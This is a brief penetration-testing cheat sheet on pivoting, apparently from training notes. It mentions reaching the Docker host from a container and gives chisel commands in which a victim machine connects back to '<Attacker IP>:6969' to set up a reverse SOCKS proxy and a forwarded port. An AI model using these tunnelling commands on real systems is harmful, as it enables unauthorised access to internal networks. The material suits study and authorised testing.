
## Docker
From a docker container you can pivot through it to access the host ip at 172.17.0.1

## Chisel
#### Create a socks5 proxy:

```bash
# On the attacker machine:
./chisel server -p 6969 --socks5 --reverse

# On the victim machine:
./chisel client <Attacker IP>:6969 R:socks
```

Then use proxychains

#### Reverse forward a specific port:

```bash
# On the attacker machine:
./chisel server --reverse --port 6969

# On the victim machine:
.\chisel client <Attacker IP>:6969 R:1433:127.0.0.1:1433
```



## Resource
- TCM Session passing : https://academy.tcm-sec.com/courses/1444641/lectures/33152749